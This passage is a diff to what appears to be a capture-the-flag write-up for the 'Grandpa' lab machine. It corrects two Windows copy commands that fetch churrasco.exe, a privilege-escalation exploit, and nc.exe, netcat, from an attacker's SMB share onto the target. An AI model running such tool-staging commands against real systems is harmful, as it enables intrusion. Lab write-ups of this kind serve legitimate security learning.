@@ -150,8 +150,8 @@ Then I connect to the share and copy the files over from the target using:
 
 ```cmd
 net use \\10.10.14.46\grandpa
-copy \\10.10.14.46\grandpa\churrasco.exe
-copy \\10.10.14.46\grandpa\nc.exe
+copy \\10.10.14.46\grandpa\churrasco.exe .
+copy \\10.10.14.46\grandpa\nc.exe .
 ```
 
 Now we can see both files are on the target:
